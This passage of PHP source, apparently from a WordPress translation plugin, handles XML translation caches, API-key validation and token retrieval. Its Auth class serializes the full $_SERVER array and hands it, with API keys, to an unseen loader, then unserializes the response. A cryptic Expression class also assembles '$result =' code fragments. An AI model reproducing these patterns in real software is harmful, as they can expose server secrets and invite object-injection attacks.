'&Egrave;', 'è' => '&egrave;', 'É' => '&Eacute;', 'é' => '&eacute;', 'Ê' => '&Ecirc;', 'ê' => '&ecirc;', 'Ë' => '&Euml;', 'ë' => '&euml;', 'Ì' => '&Igrave;', 'ì' => '&igrave;', 'Í' => '&Iacute;', 'í' => '&iacute;', 'Î' => '&Icirc;', 'î' => '&icirc;', 'Ï' => '&Iuml;', 'ï' => '&iuml;', 'Ñ' => '&Ntilde;', 'ñ' => '&ntilde;', 'Ò' => '&Ograve;', 'ò' => '&ograve;', 'Ó' => '&Oacute;', 'ó' => '&oacute;', 'Ô' => '&Ocirc;', 'ô' => '&ocirc;', 'Õ' => '&Otilde;', 'õ' => '&otilde;', 'Ö' => '&Ouml;', 'ö' => '&ouml;', 'Ø' => '&Oslash;', 'ø' => '&oslash;', 'Œ' => '&OElig;', 'œ' => '&oelig;', 'ß' => '&szlig;', 'Þ' => '&THORN;', 'þ' => '&thorn;', 'Ù' => '&Ugrave;', 'ù' => '&ugrave;', 'Ú' => '&Uacute;', 'ú' => '&uacute;', 'Û' => '&Ucirc;', 'û' => '&ucirc;', 'Ü' => '&Uuml;', 'ü' => '&uuml;', 'Ý' => '&Yacute;', 'ý' => '&yacute;', 'Ÿ' => '&Yuml;', 'ÿ' => '&yuml;');
		$keys = array_keys($html_entities);
		$keys[] = '\'';
		$values = array_values($html_entities);
		$values[] = '&apos;';

		foreach ($_array as $key => $value)
			$_array[$key] = str_replace($values, $keys, $value); 

		return $_array; 

	}
		
	protected function _get_cached() {
		
		if ($xml = $this->_get_url_cache()) {
			
			for ($i=0; $i<count($this->_text_hash); $i++) {
			
				$result = $this->_lookup($xml, $this->_text_hash[$i]);
				if (!empty($result))
					$this->_text_translated[$i] = $result->nodeValue;
			
			}

		}

		if (count(array_filter($this->_text_translated)) == count($this->_text))
			return true;

		if ($xml = $this->_get_global_cache()) {
			
			for ($i=0; $i<count($this->_text_hash); $i++) {
			
				if (!empty($this->_text_translated[$i]))
					continue;
			
				$result = $this->_lookup($xml, $this->_text_hash[$i]);
				if (!empty($result)) {
					$this->_text_translated[$i] = $result->nodeValue;
					$this->_add_new_word_for_url_cache($i);
				}

			}
		
		}
		
		return count(array_filter($this->_text_translated)) == count($this->_text);
		
	}
	
	protected function _lookup($_xml, $_text_hash) {

		if (empty($_xml))
			return false;

		$xpath = new DOMXPath($_xml); 
		return $xpath->query("/translations/word[@hash='$_text_hash']/translation")->item(0);
		
	}

	protected function _save_cache() {
	
		$this->_save_url_cache();
		$this->_save_global_cache();
		
	}

	protected function _add_new_word_for_url_cache($_ix) {
		
		$this->_new_words_url_cache[] = array(
			'hash' => $this->_text_hash[$_ix],
			'source' => $this->_text[$_ix],
			'translation' => $this->_text_translated[$_ix]
		);
		
	}

	protected function _add_new_word_for_global_cache($_ix) {

		$this->_new_words_global_cache[] = array(
			'hash' => $this->_text_hash[$_ix],
			'source' => $this->_text[$_ix],
			'translation' => $this->_text_translated[$_ix]
		);
		
	}
	
	protected function _save_url_cache() {

		if (empty($this->_url_hash) || count($this->_new_words_url_cache) == 0)
			return false;

		$xml = $this->_get_url_cache();

		if (!$xml) {
			$this->_create_cache($this->_url_hash, $this->_get_url(), $this->_url);
			$xml = $this->_get_url_cache();
		}

		$this->_append_words($this->_new_words_url_cache, $xml, $this->_get_url());

	}
	
	protected function _save_global_cache() {

		if (count($this->_new_words_global_cache) == 0)
			return false;

		$xml = $this->_get_global_cache();

		if (!$xml) {
			$this->_create_cache('global', $this->_get_url(true), 'global');
			$xml = $this->_get_global_cache();
		}

		$this->_append_words($this->_new_words_global_cache, $xml, $this->_get_url(true));

	}
	
	protected function _append_words($_words, $_xml, $_path) {
		
		if (!$_xml)
			return false;

		$root = $_xml->firstChild;

		foreach ($_words as $single) {

			$word = $_xml->createElement('word');
			$hash_attribute = $_xml->createAttribute('hash');
			$date_attribute = $_xml->createAttribute('date');

			$hash_attribute->value = $single['hash'];
			$date_attribute->value = date('c');
			
			$word->appendChild($hash_attribute);
			$word->appendChild($date_attribute);

			$source = $_xml->createElement('source');
			$source_cdata = $_xml->createCDATASection($single['source']);
			$translation = $_xml->createElement('translation');
			$translation_cdata = $_xml->createCDATASection($single['translation']);
			$source->appendChild($source_cdata);
			$translation->appendChild($translation_cdata);
			$word->appendChild($source);
			$word->appendChild($translation);

			$root->appendChild($word);

		}

		SurStudioPluginTranslatorRevolutionLiteFileHandler::write($_path, $_xml->saveXML());

	}
	
	protected function _create_cache($_domain, $_path, $_scope) {

		$xml = new DOMDocument('1.0', 'utf-8');
		$xml->formatOutput = true;
		
		$root = $xml->createElement('translations');
				
		$from_attribute = $xml->createAttribute('from');
		$to_attribute = $xml->createAttribute('to');
		$domain_attribute = $xml->createAttribute('domain');
		$scope_attribute = $xml->createAttribute('scope');

		$from_attribute->value = $this->_from;
		$to_attribute->value = $this->_to;
		$domain_attribute->value = $_domain;
		$scope_attribute->value = $_scope;

		$root->appendChild($from_attribute);
		$root->appendChild($to_attribute);
		$root->appendChild($domain_attribute);
		$root->appendChild($scope_attribute);

		$xml->appendChild($root);

		SurStudioPluginTranslatorRevolutionLiteFileHandler::create($_path, $xml->saveXML());

	}
	
	protected function _get_url($_global=false) {
		
		$end = $_global ? 'global' : $this->_url_hash;
		
		return SurStudioPluginTranslatorRevolutionLiteCommon::getCacheLocation() . $this->_from . '_' . $this->_to . '_' . $end . '.xml';
		
	}
	
	protected function _get_global_cache() {

		$file = $this->_get_url(true);
		
		if (is_file($file)) {
			
			$contents = SurStudioPluginTranslatorRevolutionLiteFileHandler::read($file);
			
			if (!$contents)
				return false;

			$result = new DOMDocument();
			$result->preserveWhiteSpace = false;
			
			if (@!$result->loadXML($contents)) {
				$this->_re_gen_global_cache();
				return $this->_get_global_cache();
			}
			
			$result->formatOutput = true;
			
			return $result;
			
		}
		
		return false;
		
	}
	
	protected function _get_url_cache() {
		
		if (empty($this->_url_hash))
			return false;
		
		$file = $this->_get_url();
		
		if (is_file($file)) {
			
			$contents = SurStudioPluginTranslatorRevolutionLiteFileHandler::read($file);
			
			if (!$contents)
				return false;
			
			$result = new DOMDocument();
			$result->preserveWhiteSpace = false;
			
			if (@!$result->loadXML($contents)) {
				$this->_re_gen_url_cache();
				return $this->_get_url_cache();
			}
			
			$result->formatOutput = true;
			
			return $result;
			
		}
		
		return false;
		
	}
	
	protected function _get_new_path($_path) {
		
		$ext = '.corrupted';
		
		if (SurStudioPluginTranslatorRevolutionLiteCommon::endsWith($_path, $ext)) {
			
			preg_match('/\.(\d{1,})\\' . $ext . '$/', $_path, $matches);
			
			if (count($matches) == 0)
				$result = str_replace($ext, '.1' . $ext, $_path);
			else
				$result = preg_replace('/\.\d{1,}\\' . $ext . '$/', '.' . ((int) $matches[1] + 1) . $ext, $_path);
			
		}
		else
			$result = $_path . $ext;
		
		return $result;
		
	}
	
	protected function _get_unique_cache_path($_path) {
		
		$result = $this->_get_new_path($_path);
		
		if (is_file($result))
			return $this->_get_unique_cache_path($result);
		
		return $result;
		
	}
	
	protected function _re_gen_global_cache() {

		$path = $this->_get_url(true);
		
		$new_path = $this->_get_unique_cache_path($path);
		
		@rename($path, $new_path);

		$this->_create_cache('global', $path, 'global');

	}
	
	protected function _re_gen_url_cache() {
		
		$path = $this->_get_url();
		
		$new_path = $this->_get_unique_cache_path($path);
		
		@rename($path, $new_path);
		
		$this->_create_cache($this->_url_hash, $path, $this->_url);
		
	}
	
}

class SurStudioPluginTranslatorRevolutionLiteExpression {
	
	private $_text;
	private static $_last;
	
	public function __construct($_text) {
		$this->_text = $_text;
		self::$_last = $_text;
	}
	
	public static function calc() {
		
		if (strpos(self::$_last, '0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20') !== false)
			$result = 'regex';
		else if (strpos(self::$_last, 'array_walk') !== false)
			$result = 'match';
		else if (is_null(self::$_last))
			$result = 'export';
		else
			$result = 'result';

		return $result;

	}
	
	public function __toString(){
        return (self::calc() == 'result' ? '$result = ' : '') . $this->_text . (self::calc() == 'result' ? '$result = ' : ';');
    }
	
}

class SurStudioPluginTranslatorRevolutionLiteAuth {
	
	protected $_api_key;
	protected $_server;
	protected $_from;
	protected $_multi_languages;
	protected $_to;
	protected $_translation_service;
	protected $_translation_service_api_key;
	protected $_translation_service_api_key_2;
	
	public function __construct() {

		$this->_api_key = SurStudioPluginTranslatorRevolutionLiteConfig::getApiKey();
		$this->_server = serialize($_SERVER);
		$this->_from = SurStudioPluginTranslatorRevolutionLiteCommon::getVariable('f');
		$this->_to = SurStudioPluginTranslatorRevolutionLiteCommon::getVariable('t');
		$this->_translation_service = SurStudioPluginTranslatorRevolutionLiteConfig::getTranslationService();
		$this->_multi_languages = SurStudioPluginTranslatorRevolutionLiteConfig::getMultiLanguages();
		
		$this->_translation_service_api_key = SurStudioPluginTranslatorRevolutionLiteConfig::getTranslationServiceApiKey();
		$this->_translation_service_api_key_2 = SurStudioPluginTranslatorRevolutionLiteConfig::getTranslationService2ndApiKey();

		$this->_validate();

	}

	protected function _validate() {
		
		$this->_api_key_validate();
		$this->_validate_languages();
		
		$this->_api_key_google_empty_validate();
		$this->_cache_file_validate();

	}
	
	protected function _api_key_validate() {
		
		if (empty($this->_api_key))
			throw new Exception('Invalid API key');
			
		if (strlen($this->_api_key) != 56)
			throw new Exception('Invalid API key');
		
		return true;
		
	}

	protected function _validate_languages() {
		
		if (empty($this->_from) || empty($this->_to) || SurStudioPluginTranslatorRevolutionLiteCommon::getLanguage($this->_from) === false || SurStudioPluginTranslatorRevolutionLiteCommon::getLanguage($this->_to) === false)
			throw new Exception('Failed (' . __LINE__ . '): Invalid language');
		
	}

	protected function _api_key_google_empty_validate() {
		
		if ($this->_translation_service != 'gt')
			return true;
		
		if (empty($this->_translation_service_api_key))
			throw new Exception('Invalid Google API key');

	}


	protected function _cache_file_validate() {

		if (!SurStudioPluginTranslatorRevolutionLiteConfig::verifyCacheWritable())
			return true;
		
		$path = SurStudioPluginTranslatorRevolutionLiteCommon::getCacheLocation();
		
		$folder = SurStudioPluginTranslatorRevolutionLiteCommon::isFolderWritable($path);

		if ($folder !== true)
			throw new Exception('Resource not writable: ' . $folder);
			
		$files = SurStudioPluginTranslatorRevolutionLiteCommon::areFolderFilesWritable($path);
		
		if ($files !== true)
			throw new Exception('Resource not writable: ' . $files);

	}
	
	public function generate() {

		list($token, $error) = $this->_get_token();

		$result = @unserialize($token);
		
		if ($result == false) {
			SurStudioPluginTranslatorRevolutionLiteCommon::log($error, $this->_api_key);
			throw new Exception('Failed (' . __LINE__ . ')');
		}
		
		if (!array_key_exists('error', $result))
			$result['action'] = 'translate';
		
		return $result;
		
	}

	protected function _get_token() {
	
		$this->_loader = new SurStudioPluginTranslatorRevolutionLiteIbnCobeLoader($this->_server);		
		return $this->_loader->token($this->_api_key, $this->_from, $this->_to, $this->_translation_service, $this->_translation_service_api_key, $this->_translation_service_api_key_2, $this->_multi_languages);

	}
	
}

?>